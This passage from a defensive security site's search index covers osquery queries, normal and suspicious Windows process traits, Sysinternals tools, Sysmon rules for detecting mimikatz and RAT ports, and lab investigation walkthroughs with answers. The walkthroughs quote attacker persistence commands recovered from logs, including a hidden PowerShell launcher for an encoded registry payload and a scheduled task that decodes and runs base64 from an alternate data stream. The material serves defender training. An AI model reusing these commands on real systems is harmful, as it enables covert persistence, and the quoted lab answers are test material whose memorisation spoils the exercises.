Background, Offense, and Defense",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "29bbf1fdc6c8f702decbc319b9b1c322",
    "u": "https://edr.tymyrddin.dev/docs/osquery/queries",
    "t": "Creating queries ",
    "c": "Creating queries  The SQL language implemented in Osquery is a superset of SQLite. All queries will start with a SELECT statement. There is no updating or deleting any information/data on the endpoint. The exception to the rule: Using other SQL statements, such as UPDATE and DELETE, is possible, but only when creating run-time tables (views) or using an extension if the extension supports them. Queries will also include a FROM clause and end with a semicolon. Exploring installed programs  To retrieve all the information about the installed programs on the endpoint ( LIMIT limits the results to display): osquery>select * from programs limit 1; name = 7-Zip 21.07 (x64) version = 21.07 install_location = C:\\Program Files\\7-Zip\\ install_source = language = publisher = Igor Pavlov uninstall_string = \"C:\\Program Files\\7-Zip\\Uninstall.exe\" install_date = identifying_number = To select specific columns rather than retrieve every column in the table: osquery>select name, version, install_location, install_date from programs limit 1; name = 7-Zip 21.07 (x64) version = 21.07 install_location = C:\\Program Files\\7-Zip\\ install_date = Count  To see how many programs or entries in any table are returned: osquery>select count(*) from programs; count(*) = 160 WHERE clause  To get the user table and only display the result for the user James: osquery>SELECT * FROM users WHERE username='James'; uid = 1002 gid = 544 uid_signed = 1002 gid_signed = 544 username = James description = directory = C:\\Users\\James shell = C:\\Windows\\system32\\cmd.exe uuid = S-1-5-21-605937711-2036809076-574958819-1002 type = local The equal sign is not the only filtering option in a WHERE clause: The equal sign is not the only filtering option in a WHERE clause. Below are filtering operators that can be used in a WHERE clause: Sign Meaning = equal <> not equal >, >= greater than, greater than, or equal to <, <= less than or less than or equal to BETWEEN between a range LIKE pattern wildcard searches % wildcard, multiple characters _ wildcard, one character Matching wildcard rules  String Meaning % Match all files and folders for one level %% Match all files and folders recursively %abc Match all within-level ending in \"abc\" abc% Match all within-level starting with \"abc\" Examples: String Meaning /Users/%/Library Monitor for changes to every user's Library folder, but not the contents within /Users/%/Library/ Monitor for changes to files within each Library folder, but not the contents of their subdirectories /Users/%/Library/% Same, changes to files within each Library folder /Users/%/Library/%% Monitor changes recursively within each Library /bin/%sh Monitor the bin directory for changes ending in sh Some tables require a WHERE clause, such as the file table, to return a value. If the required WHERE clause is not included in the query, osquery will give an error. osquery>select * from file; W1017 12:38:29.730041 45744 virtual_table.cpp:965] Table file was queried without a required column in the WHERE clause W1017 12:38:29.730041 45744 virtual_table.cpp:976] Please see the table documentation: https://osquery.io/schema/#file Error: constraint failed Joining tables  Osquery can also be used to join two tables based on a column that is shared by both tables. osquery>.schema users CREATE TABLE users(`uid` BIGINT, `gid` BIGINT, `uid_signed` BIGINT, `gid_signed` BIGINT, `username` TEXT, `description` TEXT, `directory` TEXT, `shell` TEXT, `uuid` TEXT, `type` TEXT, `is_hidden` INTEGER HIDDEN, `pid_with_namespace` INTEGER HIDDEN, PRIMARY KEY (`uid`, `username`, `uuid`, `pid_with_namespace`)) WITHOUT ROWID; osquery>.schema processes CREATE TABLE processes(`pid` BIGINT, `name` TEXT, `path` TEXT, `cmdline` TEXT, `state` TEXT, `cwd` TEXT, `root` TEXT, `uid` BIGINT, `gid` BIGINT, `euid` BIGINT, `egid` BIGINT, `suid` BIGINT, `sgid` BIGINT, `on_disk` INTEGER, `wired_size` BIGINT, `resident_size` BIGINT, `total_size` BIGINT, `user_time` BIGINT, `system_time` BIGINT, `disk_bytes_read` BIGINT, `disk_bytes_written` BIGINT, `start_time` BIGINT, `parent` BIGINT, `pgroup` BIGINT, `threads` INTEGER, `nice` INTEGER, `elevated_token` INTEGER, `secure_process` INTEGER, `protection_type` TEXT, `virtual_process` INTEGER, `elapsed_time` BIGINT, `handle_count` BIGINT, `percent_processor_time` BIGINT, `upid` BIGINT HIDDEN, `uppid` BIGINT HIDDEN, `cpu_type` INTEGER HIDDEN, `cpu_subtype` INTEGER HIDDEN, `translated` INTEGER HIDDEN, `cgroup_path` TEXT HIDDEN, `phys_footprint` BIGINT HIDDEN, PRIMARY KEY (`pid`)) WITHOUT ROWID; Looking at both schemas, uid in users table is meant to identify the user record, and in the processes table, the column uid represents the user responsible for executing the particular process. The tables can be joined using this uid field: $ osqueryi Using a virtual database. Need help, type '.help' osquery>select p.pid, p.name, p.path, u.username from processes p JOIN users u on u.uid=p.uid LIMIT 10; +-------+-------------------+---------------------------------------+----------+ | pid | name | path | username | +-------+-------------------+---------------------------------------+----------+ | 7560 | sihost.exe | C:\\Windows\\System32\\sihost.exe | James | | 6984 | svchost.exe | C:\\Windows\\System32\\svchost.exe | James | | 7100 | svchost.exe | C:\\Windows\\System32\\svchost.exe | James | | 7144 | svchost.exe | C:\\Windows\\System32\\svchost.exe | James | | 8636 | ctfmon.exe | C:\\Windows\\System32\\ctfmon.exe | James | | 8712 | taskhostw.exe | C:\\Windows\\System32\\taskhostw.exe | James | | 9260 | svchost.exe | C:\\Windows\\System32\\svchost.exe | James | | 10168 | RuntimeBroker.exe | C:\\Windows\\System32\\RuntimeBroker.exe | James | | 10232 | RuntimeBroker.exe | C:\\Windows\\System32\\RuntimeBroker.exe | James | | 8924 | svchost.exe | C:\\Windows\\System32\\svchost.exe | James | +-------+-------------------+---------------------------------------+----------+ Example use  A table autoexec contains the list of executables that are automatically executed on the target machine. There seems to be a batch file that runs automatically. What is the name of that batch file (with the extension .bat)? What is the full path of the batch file found in the above question? osquery> .schema autoexec CREATE TABLE autoexec(`path` TEXT, `name` TEXT, `source` TEXT, PRIMARY KEY (`path`)) WITHOUT ROWID; osquery> select * from autoexec WHERE name LIKE '%.bat'; +---------------------------------------------------------------------------------------------+----------------+---------------+ | path | name | source | +---------------------------------------------------------------------------------------------+----------------+---------------+ | C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat | batstartup.bat | startup_items | | C:\\Users\\James\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat | batstartup.bat | startup_items | +---------------------------------------------------------------------------------------------+----------------+---------------+ osquery>",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "b1849ec76cd44ec860e38469a19b5ce8",
    "u": "https://edr.tymyrddin.dev/docs/core/explorer",
    "t": "explorer.exe ",
    "c": "explorer.exe  Windows Explorer, explorer.exe , gives the user access to their folders and files. It also provides functionality for other features, such as the Start Menu and Taskbar. The Winlogon process runs userinit.exe , which launches the value in HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell . userinit.exe exits after spawning explorer.exe . Because of this, the parent process is non-existent. There will be many child processes for explorer.exe . Normal  Image Path: %SystemRoot%\\explorer.exe Parent Process: Created by userinit.exe and exits Number of Instances: One or more per interactively logged-in user User Account: Logged-in user(s) Start Time: First instance when the first interactive user logon session begins Unusual  An actual parent process. ( userinit.exe calls this process and exits) Image file path other than C:\\Windows Running as an unknown user Subtle misspellings to hide rogue processes in plain sight Outbound TCP/IP connections",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "43ee75ea041035d8665e5b4a7f85ba42",
    "u": "https://edr.tymyrddin.dev/docs/core/svchost",
    "t": "svchost.exe ",
    "c": "svchost.exe  The Service Host (Host Process for Windows Services), or svchost.exe , is responsible for hosting and managing Windows services. The services running in this process are implemented as DLLs. The DLL to implement is stored in the registry for the service under the Parameters subkey in ServiceDLL . The full path is HKLM\\SYSTEM\\CurrentControlSet\\Services\\SERVICE NAME\\Parameters . There is always a key identifier in the binary path, and that identifier is -k . This is how a legitimate svchost.exe process is called. The -k parameter is for grouping similar services to share the same process. This concept was based on the OS design and implemented to reduce resource consumption. Starting from Windows 10 Version 1703, services grouped into host processes changed. On machines running more than 3.5 GB of memory, each service will run its own process. Since svchost.exe will always have multiple running processes on any Windows system, this process has been a target for malicious use. Adversaries create malware to masquerade as this process and try to hide amongst the legitimate svchost.exe processes. They can name the malware svchost.exe or misspell it slightly, such as scvhost.exe . By doing so, the intention is to go under the radar. Another tactic is to install/call a malicious service (DLL). Normal  Image Path: %SystemRoot%\\System32\\svchost.exe Parent Process: services.exe Number of Instances: Many User Account: Varies (SYSTEM, Network Service, Local Service) depending on the svchost.exe instance. In Windows 10, some instances run as the logged-in user. Start Time: Typically within seconds of boot time. Other instances of svchost.exe can be started after boot. Unusual  A parent process other than services.exe Image file path other than C:\\Windows\\System32 Subtle misspellings to hide rogue processes in plain sight The absence of the -k parameter Resources  svchost.exe The typographical and homomorphic abuse of svchost.exe, and other popular file names",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "2e1d218625344b25c78c9f22410e7575",
    "u": "https://edr.tymyrddin.dev/docs/wlogs/readme",
    "t": "Introduction ",
    "c": "THM Room: Windows event logs Introduction  What?  Windows Event Logs and the tools to query them. Why?  To understand the activity of the system, diagnose problems, and to combine log file entries from multiple sources with statistical analysis, to yield correlations between seemingly unrelated events on different servers. How?  Event logs XPath queries Scenarios",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "56490d9dd8ed09d88fa5e36310a1f65e",
    "u": "https://edr.tymyrddin.dev/docs/sysinternals/misc",
    "t": "Miscellaneous ",
    "c": "Miscellaneous  BgInfo  “It automatically displays relevant information about a Windows computer on the desktop’s background, such as the computer name, IP address, service pack version, and more.” (official definition) RegJump  “This little command-line applet takes a registry path and makes Regedit open to that path. It accepts root keys in standard (e.g. HKEY_LOCAL_MACHINE) and abbreviated form (e.g. HKLM).” (official definition) Strings  “Strings just scans the file you pass it for UNICODE (or ASCII) strings of a default length of 3 or more UNICODE (or ASCII) characters. Note that it works under Windows 95 as well.” (official definition) Question  Run the Strings tool on ZoomIt.exe . What is the full path to the .pdb file? C:\\Tools\\sysint>strings .\\zoomit.exe | findstr /i .pdb",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "87f411ac2cb9eeda1bbced5abd202c15",
    "u": "https://edr.tymyrddin.dev/docs/sysinternals/file",
    "t": "File and disk utilities ",
    "c": "File and disk utilities  Sigcheck  “ Sigcheck is a command-line utility that shows file version number, timestamp information, and digital signature details, including certificate chains. It also includes an option to check a file’s status on VirusTotal, a site that performs automated file scanning against over 40 antivirus engines, and an option to upload a file for scanning.” (official definition). Example: sigcheck -u -e c:\\windows\\system32 And investigate the purpose of any files that are not signed. Streams  “The NTFS file system provides applications the ability to create alternate data streams of information. By default, all data is stored in a file’s main unnamed data stream, but by using the syntax file:stream , you are able to read and write to alternates.” (official definition) Alternate Data Streams (ADS) is a file attribute specific to Windows NTFS (New Technology File System). Every file has at least one data stream ( $DATA ) and ADS allows files to contain more than one stream of data. Natively Window Explorer doesn’t display ADS to the user. There are 3rd party executables that can be used to view this data, but Powershell gives you the ability to view ADS for files. Malware writers have used ADS to hide data in an endpoint, but not all its uses are malicious. When you download a file from the Internet unto an endpoint, there are identifiers written to ADS to identify that it was downloaded from the Internet. Question  There is a txt file on the desktop named file.txt . Using one of the three tools, what is the text within the ADS? Open a cmd : C:\\Users\\Administrator>cd desktop C:\\Users\\Administrator>stream file.txt There is an ads.txt inside. C:\\Users\\Administrator>notepad file.txt:ads.txt Answer: I am hiding in the stream. SDelete  “ SDelete is a command line utility that takes a number of options. In any given use, it allows you to delete one or more files and/or directories, or to cleanse the free space on a logical disk.” SDelete (Secure Delete) implements the DOD 5220.22-M (Department of Defense clearing and sanitizing protocol) and has been used by adversaries and is associated with MITRE techniques T1485 (Data Destruction) and T1070.004 (Indicator Removal on Host: File Deletion) in MITRE ID S0195 .",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "a9f6264140f9cf4a8cf0001e18b98ef7",
    "u": "https://edr.tymyrddin.dev/docs/core/wininit",
    "t": "wininit.exe ",
    "c": "wininit.exe  The Windows Initialization Process, wininit.exe , is responsible for launching services.exe (Service Control Manager), lsass.exe (Local Security Authority), and lsaiso.exe within Session 0. It is another critical Windows process that runs in the background, along with its child processes. Note: lsaiso.exe is a process associated with Credential Guard and KeyGuard. You will only see this process if Credential Guard is enabled. Normal  Image Path: %SystemRoot%\\System32\\wininit.exe Parent Process: Created by an instance of smss.exe Number of Instances: One User Account: Local System Start Time: Within seconds of boot time Unusual  An actual parent process. ( smss.exe calls this process and self-terminates) Image file path other than C:\\Windows\\System32 Subtle misspellings to hide rogue processes in plain sight Multiple running instances Not running as SYSTEM",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "ef7e14492265cef68c99c4dfe71a4322",
    "u": "https://edr.tymyrddin.dev/docs/sysmon/readme",
    "t": "Introduction ",
    "c": "THM Room: Sysmon Introduction  What?  Sysmon (SysInternals Suite) can be used for monitoring and logging events on Windows endpoints and environments. Why?  To detect malicious activity by tracking code and network traffic. How?  Event IDs Cutting out the noise Hunting metasploit Detecting mimikatz Hunting malware Hunting persistence Detecting evasion techniques Practical investigations",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "ee71201e1dac2df234be7e1a92e6e00a",
    "u": "https://edr.tymyrddin.dev/docs/sysmon/mimikatz",
    "t": "Detecting mimikatz ",
    "c": "Detecting mimikatz  Mimikatz is well known and commonly used to dump credentials from memory along with other Windows post-exploitation activity. Mimikatz is mainly known for dumping LSASS. We can hunt for the file created, execution of the file from an elevated process, creation of a remote thread, and processes that Mimikatz creates. Anti-Virus will typically pick up Mimikatz as the signature is very well known, but it is still possible for threat actors to obfuscate or use droppers to get the file onto the device. Mimikatz file creation config  The first method of hunting for mimikatz is just looking for files created with its name. This is a simple technique and can allow you to find anything that might have bypassed AV. Most of the time when dealing with an advanced threat more advanced hunting techniques like searching for LSASS behaviour are needed. <RuleGroup name=\"\" groupRelation=\"or\"> <FileCreate onmatch=\"include\"> <TargetFileName condition=\"contains\">mimikatz</TargetFileName> </FileCreate> </RuleGroup> Abnormal LSASS behaviour config  We can use the ProcessAccess event ID to hunt for abnormal LSASS behavior. This would show potential LSASS abuse which usually connects back to mimikatz or some other kind of credential dumping tool. If LSASS is accessed by a process other than svchost.exe it should be considered suspicious behaviour and should be investigated further. To aid in looking for suspicious events, use a filter to only look for processes besides svchost.exe . Sysmon will provide further details to help lead the investigation such as the file path the process originated from. To aid in detections, use a custom configuration file: <RuleGroup name=\"\" groupRelation=\"or\"> <ProcessAccess onmatch=\"include\"> <TargetImage condition=\"image\">lsass.exe</TargetImage> </ProcessAccess> </RuleGroup> Obfuscated version of mimikatz dumping credentials  Open C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Practice\\Hunting_LSASS.evtx in Event Viewer to view an attack using an obfuscated version of mimikatz to dump credentials from memory. The event shows the mimikatz process accessed, and there are also a lot of svchost.exe events. Alter the config to exclude events with the SourceImage event coming from svhost.exe : <RuleGroup name=\"\" groupRelation=\"or\"> <ProcessAccess onmatch=\"exclude\"> <SourceImage condition=\"image\">svchost.exe</SourceImage> </ProcessAccess> <ProcessAccess onmatch=\"include\"> <TargetImage condition=\"image\">lsass.exe</TargetImage> </ProcessAccess> </RuleGroup> Detecting LSASS Behavior with PowerShell  Use the same XPath queries used in the rule to filter out the other processes from TargetImage . Get-WinEvent -Path <Path to Log> -FilterXPath '*/System/EventID=10 and */EventData/Data[@Name=\"TargetImage\"] and */EventData/Data=\"C:\\Windows\\system32\\lsass.exe\"' Resources  MITRE ATT&CK T1055 MITRE ATT&CK S0002",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "725fc50ef8e0e0cea0c73220e349adbf",
    "u": "https://edr.tymyrddin.dev/docs/sysinternals/network",
    "t": "Networking utilities ",
    "c": "Networking utilities  TCPView  “ TCPView is a Windows program that will show detailed listings of all TCP and UDP endpoints on your system, including the local and remote addresses and state of TCP connections. On Windows Server 2008, Vista, and XP, TCPView also reports the name of the process that owns the endpoint. TCPView provides a more informative and conveniently presented subset of the Netstat program that ships with Windows. The TCPView download includes Tcpvcon , a command-line version with the same functionality.” (official definition) Windows has a built-in utility that provides the same functionality. This tool is called Resource Monitor. There are many ways to open this tool. From the command line use resmon . Question  Using WHOIS tools, what is the ISP/Organization for the remote address in the screenshot? With Listen unselected in the Connection States from the States Filter and UDP v4 and UDP v6 turned off from the top toolbar. whois 52.154.170.73 ... NetRange: 52.145.0.0 - 52.191.255.255 CIDR: 52.148.0.0/14, 52.160.0.0/11, 52.152.0.0/13, 52.146.0.0/15, 52.145.0.0/16 NetName: MSFT NetHandle: NET-52-145-0-0-1 Parent: NET52 (NET-52-0-0-0-0) NetType: Direct Allocation OriginAS: Organization: Microsoft Corporation (MSFT) RegDate: 2015-11-24 Updated: 2021-12-14 Ref: https://rdap.arin.net/registry/ip/52.145.0.0 ... Answer: Microsoft Corporation",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "b7459cc600f6f86ba330cb481df106e1",
    "u": "https://edr.tymyrddin.dev/docs/sysmon/noise",
    "t": "Cutting out the noise ",
    "c": "Cutting out the noise  Since most of the normal activity or “noise” seen on a network is excluded or filtered out with Sysmon we are able to focus on meaningful events. This allows us to quickly identify and investigate suspicious activity. When actively monitoring a network you will want to use multiple detections and techniques simultaneously in an effort to identify threats. Best Practices  Sysmon offers a fairly open and configurable platform. There are a few best practices that can be implemented to ensure operating efficiently and not missing any potential threats. Exclude > Include: When creating rules for the Sysmon configuration file, exclude events rather than include events. This prevents you from accidentally missing crucial events and only seeing the events that matter the most. CLI gives you further control: As is common with most applications the CLI gives you the most control and filtering, allowing for further granular control. You can use either Get-WinEvent or wevutil.exe to access and filter logs. When Sysmon is used with a SIEM or other detection solutions these tools will become less used and needed. Knowing the environment is important when implementing any platform or tool. Have a firm understanding of the network or environment you are working within to fully understand what is normal and what is suspicious in order to effectively craft rules. Filtering events with Event Viewer  Event Viewer might not the best for filtering events and out-of-the-box offers limited control over logs. The main filter you will be using with Event Viewer is by EventID and keywords. You can also choose to filter by writing XML but this is a tedious process that does not scale well. To open the filter menu select Filter Current Log from the Actions menu. Filtering events with PowerShell  To view and filter events with PowerShell, use Get-WinEvent with XPath queries . We can use any XPath queries that can be found in the XML view of events. We will be using wevutil.exe to view events once filtered. The command line is preferred over the Event Viewer GUI as it allows for further granular control and filtering. Some basic filters: Filter by Event ID: */System/EventID=<ID> Filter by XML Attribute/Name: */EventData/Data[@Name=\"<XML Attribute/Name>\"] Filter by Event Data: */EventData/Data=<Data> Putting these filters together with attributes and data will get the most control out of the logs. As an example of using Get-WinEvent to look for network connections coming from port 4444: Get-WinEvent -Path <Path to Log> -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name=\"DestinationPort\"] and */EventData/Data=4444' Questions  How many event ID 3 events are in C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Practice\\Filtering.evtx ? Open the Filtering.evtx file and in the Event Viewer App under Saved logs, click Filtering, and filter the current log by ID 3 : Answer: 73,591 What is the UTC time created of the first network event in C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Practice\\Filtering.evtx ? Scroll to the bottom of the list, click on the last row, in the middle bottom panel under General you will find the UTC time for the event. Answer: 2021-01-06 01:35:50.464",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "48792259d46ec07f71b7308b9a9fff5f",
    "u": "https://edr.tymyrddin.dev/docs/sysmon/investigations",
    "t": "Practical investigations ",
    "c": "Practical investigations  ugh, BILL THAT’S THE WRONG USB!  In this investigation, your team has received reports that a malicious file was dropped onto a host by a malicious USB. They have pulled the logs suspected and have tasked you with running the investigation for it. Logs are located in C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Investigations\\Investigation-1.evtx . Questions  What is the full registry key of the USB device calling svchost.exe ? In Event Viewer, look at the logs for the category called Registry value set (rule: registryEvent). There are two entries for EventID 13 . The first one is for the UWDFHost.exe , which is used to communicate with hardware devices and to load drivers. The second entry is where the USB device calls the svchost.exe . The TargetObject value contains the full registry key. With PowerShell: Get-WinEvent -Path <Path to evtx file> -FilterXPath '*/System/EventID=13 and */EventData/Data[@Name=\"Image\"]=\"C:\\Windows\\system32\\svchost.exe\"' | FL Answer: HKLM\\System\\CurrentControlSet\\Enum\\WpdBusEnumRoot\\UMB\\2&37c186b&0&STORAGE#VOLUME #_??_USBSTOR#DISK&VEN_SANDISK&PROD_U3_CRUZER_MICRO&REV_8.01#4054910EF19005B3&0#\\FriendlyName What is the device name when being called by RawAccessRead? In Event Viewer, look at EventID 9 (RawAccessRead detected). Task categories RawAccessRead . In Friendly View you can see the Device being called. With PowerShell: Get-WinEvent -Path <Path to evtx file> -FilterXPath '*/System/EventID=9' | FL Answer: \\Device\\HarddiskVolume3 What is the first exe the process executes? Arrange entries in Event Viewer by Oldest to Latest events. EventID 1 is the first process that explorer.exe creates, right after EventID 9 for RawAccessRead of explorer.exe . This shows it is rundll32.exe which is executed. Answer: rundll32.exe This isn’t an HTML file?  Another suspicious file has appeared in your logs and has managed to execute code masking itself as an HTML file, evading your antivirus detections. Open the logs and investigate the suspicious file. Logs are located in C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Investigations\\Investigation-2.evtx . Questions  What is the full path of the payload? The latest process created contains the full path under CommandLine (at the bottom). With PowerShell (view the EventID 1 entries): Get-WinEvent -Path <Path to evtx file> -FilterXPath '*/System/EventID=1' | FL Answer: C:\\Users\\IEUser\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\S97WTYG7\\update.hta What is the full path of the file the payload masked itself as? Answer: C:\\Users\\IEUser\\Downloads\\update.html What signed binary executed the payload? MITRE ATT&CK: System Binary Proxy Execution: Mshta : Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. With PowerShell: Get-WinEvent -Path C:\\evtxfiles\\Investigation-2.evtx -FilterXPath '*/System/EventID=1' | FL Answer: C:\\Windows\\System32\\mshta.exe What is the IP of the adversary? Look at the only other EventID 3 (Network connection detected). Find the Destination Port . With PowerShell: Get-WinEvent -Path C:\\evtxfiles\\Investigation-2.evtx -FilterXPath '*/System/EventID=3' | FL Answer: 10.0.2.18 What back connect port is used? Answer: 4443 Where’s the bouncer when you need him  Your team has informed you that the adversary has managed to set up persistence on your endpoints as they continue to move throughout your network. Find how the adversary managed to gain persistence using logs provided. Logs are located in C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Investigations\\Investigation-3.1.evtx and C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Investigations\\Investigation-3.2.evtx . Questions  What is the IP of the suspected adversary? A C2 is a term commonly used as an abbreviation for Command-and-Control which is the endpoint that an attacker uses to maintain communications, and send commands to a target system or network that is compromised by malware. With PowerShell, filter by EventID 3 (Network connection detected): Get-WinEvent -Path <Path to evtx file> -FilterXPath '*/System/EventID=3' | FL Answer: 172.30.1.253 What is the hostname of the affected endpoint? Answer: DESKTOP-O153T4R What is the hostname of the C2 server connecting to the endpoint? Answer: Empirec2 Where in the registry was the payload stored? Look for EventID 13 (Registry value set) for the stored payload. With PowerShell: Get-WinEvent -Path C:\\thmsysmon\\Investigations\\Investigation-3.1.evtx -FilterXPath '*/System/EventID=13' | FL Answer: HKLM\\SOFTWARE\\Microsoft\\Network\\debug What PowerShell launch code was used to launch the payload? Second Event ID 13. With PowerShell: Get-WinEvent -Path C:\\thmsysmon\\Investigations\\Investigation-3.1.evtx -FilterXPath '*/System/EventID=13' | FL Answer: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x=$((gp HKLM:Software\\Microsoft\\Network debug).debug);start -Win Hidden -A \\\"-enc $x\\\" powershell\";exit; What is the IP of the adversary? Not found in Hostname , but in DestinationPort . Answer: 172.168.103.188 What is the full path of the payload location? Instead of hiding in the registry, hides in a process, EventID 1 (Process Create). Answer: c:\\users\\q\\AppData:blah.txt What was the full command used to create the scheduled task? In PowerShell, filter by EventID 1 and Image . Get-WinEvent -Path <Path to evtx file> -FilterXPath '*/System/EventID=1 and */EventData/Data[@Name=\"Image\"]=\"C:\\Windows\\System32\\schtasks.exe\"' | FL Answer: \"C:\\WINDOWS\\system32\\schtasks.exe\" /Create /F /SC DAILY /ST 09:00 /TN Updater /TR \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($(cmd /c \"more < c:\\users\\q\\AppData:blah.txt\"’))))\\\"\" What process was accessed by schtasks.exe that would be considered suspicious behaviour? PowerShell: Get-WinEvent -Path C:\\thmsysmon\\Investigations\\Investigation-3.2.evtx -FilterXPath '*/System/EventID=10 and */EventData/Data[@Name=\"SourceImage\"]=\"C:\\WINDOWS\\system32\\lsass.exe\"' | fl Answer: lsass.exe Mom look! I built a botnet!  As the adversary has gained a solid foothold onto your network it has been brought to your attention that they may have been able to set up C2 communications on some endpoints. Collect the logs and continue your investigation. Logs are located in C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Investigations\\Investigation-4.evtx . Questions  What is the IP of the adversary? Get-WinEvent -Path Investigation-4.evtx -FilterXPath '*/System/EventID=3' | FL Answer: 172.30.1.253 What port is the adversary operating on? Answer: 80 What C2 is the adversary utilizing? Answer: empire",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "4e08292fc4ff20d9508eed5c678bc814",
    "u": "https://edr.tymyrddin.dev/docs/core/csrss",
    "t": "csrss.exe ",
    "c": "csrss.exe  csrss.exe (Client Server Runtime Process) is the user-mode side of the Windows subsystem. This process is always running and is critical to system operation. If this process is terminated by chance, it will result in system failure. This process is responsible for the Win32 console window and process thread creation and deletion. For each instance, csrsrv.dll , basesrv.dll , and winsrv.dll are loaded (along with others). This process is also responsible for making the Windows API available to other processes, mapping drive letters, and handling the Windows shutdown process. Normal  Image Path: %SystemRoot%\\System32\\csrss.exe Parent Process: Created by an instance of smss.exe Number of Instances: Two or more User Account: Local System Start Time: Within seconds of boot time for the first two instances (for Session 0 and 1). Start times for additional instances occur as new sessions are created, although only Sessions 0 and 1 are often created. Unusual  An actual parent process. ( smss.exe calls this process and self-terminates) Image file path other than C:\\Windows\\System32 Subtle misspellings to hide rogue processes masquerading as csrss.exe in plain sight The user is not the SYSTEM user. Resources  Client/Server Runtime Subsystem",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "1342373b3430198b7fd04ff870e8f644",
    "u": "https://edr.tymyrddin.dev/docs/windows/network",
    "t": "Network threat detection ",
    "c": "Network threat detection  SMB/NetBIOS auditing  Logs lateral movement via: NetSessionEnum (detects BloodHound reconnaissance) DsGetDCName (flags Golden Ticket attacks) Critical for Active Directory environments. Enable: auditpol / set / subcategory : \"Network Share\" / success : enable / failure : enable RDP/Suspicious Port Monitoring  Alerts on: Unexpected RDP connections (Event ID 4624) High-volume SMB traffic (potential ransomware) Tools: Azure Sentinel (cloud-native SIEM) Zeek (for network metadata)",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "d2de3a4b3a9be9fbc898145c9df4fc9c",
    "u": "https://edr.tymyrddin.dev/docs/sysmon/malware",
    "t": "Hunting malware ",
    "c": "Hunting malware  Malware has many forms and variations with different end goals. RATs or Remote Access Trojans are used similar to any other payload to gain remote access to a machine. RATs typically come with other antivirus and detection evasion techniques that make them different from other payloads like msfvenom . A RAT typically also uses a Client-Server model and comes with an interface for easy user administration. Examples of RATs are Xeexe and Quasar . To help detect and hunt malware, first identify the malware to hunt for or detect, and identify ways to modify configuration files (hypothesis-based hunting). There are a plethora of other ways to detect and log malware, but here only detecting open back connect ports is covered. Rats and C2 Servers config  This is similar to hunting Metasploit . We can look through and create a configuration file to hunt and detect suspicious ports open on the endpoint. The code snippet is from the Ion-Storm configuration file, and will alert on specific ports like 1034 and 1604 and exclude common network connections like OneDrive. <RuleGroup name=\"\" groupRelation=\"or\"> <NetworkConnect onmatch=\"include\"> <DestinationPort condition=\"is\">1034</DestinationPort> <DestinationPort condition=\"is\">1604</DestinationPort> </NetworkConnect> <NetworkConnect onmatch=\"exclude\"> <Image condition=\"image\">OneDrive.exe</Image> </NetworkConnect> </RuleGroup> Note: Attackers and adversaries have begun to use port 53 as part of their malware/payloads which would go undetected if you blindly used this configuration file as-is. RAT being dropped on server  Open C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Practice\\Hunting_Rats.evtx in Event Viewer to view a live rat being dropped onto the server. The event shows a custom RAT that operating on port 8080. Hunting for common back connect ports with PowerShell  Filter on the NetworkConnect event ID and the DestinationPort data attribute. Get-WinEvent -Path <Path to Log> -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name=\"DestinationPort\"] and */EventData/Data=<Port>' Resources  MITRE ATT&CK Software",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "a1fe222eec7feff7c535d6f09b127499",
    "u": "https://edr.tymyrddin.dev/docs/osquery/schemas",
    "t": "Schema documentation ",
    "c": "Schema documentation  Break down of the important information in the schema documentation: A dropdown lists various versions of Osquery. Choose the version of Osquery you wish to see schema tables for. The number of tables within the selected version of Osquery. (In the above image, 106 tables are available). The list of tables is listed in alphabetical order for the selected version of Osquery. This is the same result we get when we use the .table command in the interactive mode. The name of the table and a brief description. A detailed chart showing each table’s column, type, and description. Information to which Operating System the table applies. (In the above image, the account_policy_data table is available only for macOS) A dropdown menu to select the Operating System of choice. We can choose multiple Operating Systems, which will display the tables available for those Operating systems. Resources  Osquery 5.5.1 schema documentation",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "43030c1c228bcb0c6abe74bb944ad4e7",
    "u": "https://edr.tymyrddin.dev/docs/windows/logging",
    "t": "Persistence and logging ",
